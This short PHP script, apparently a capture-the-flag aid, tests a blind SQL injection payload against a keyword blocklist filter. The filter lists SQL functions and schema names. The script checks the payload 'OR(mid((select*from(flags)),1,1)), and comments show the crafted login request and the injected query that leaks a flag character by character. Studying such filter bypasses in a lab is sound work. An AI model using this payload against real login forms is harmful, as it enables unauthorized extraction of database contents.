<?php

function check($input){
	  $forbid = "0x|0b|limit|glob|php|load|inject|month|day|now|collationlike|regexp|limit|_|information|schema|char|sin|cos|asin|procedure|trim|pad|make|mid";
      $forbid .= "substr|compress|where|code|replace|conv|insert|right|left|cast|ascii|x|hex|version|data|load_file|out|gcc|locate|count|reverse|b|y|z|--";
      #echo $forbid;
      if (preg_match("/$forbid/i", $input) or preg_match('/\s/', $input) or preg_match('/[\/\\\\]/', $input) or preg_match('/(--|#|\/\*)/', $input))
	     {
      	echo ('forbidden');
         }
     else{
        echo ('NOT forbidden');
         }
     
}
$user="'OR(mid((select*from(flags)),1,1))='a";
$pass='admin';
check($user);
check($pass);


#user=admin'OR(mid((select*from(flags)),1,1))='a&pass=test
#SELECT * FROM users WHERE username='admin'OR(mid((select*from(flags)),1,1))='a' AND password='anything';
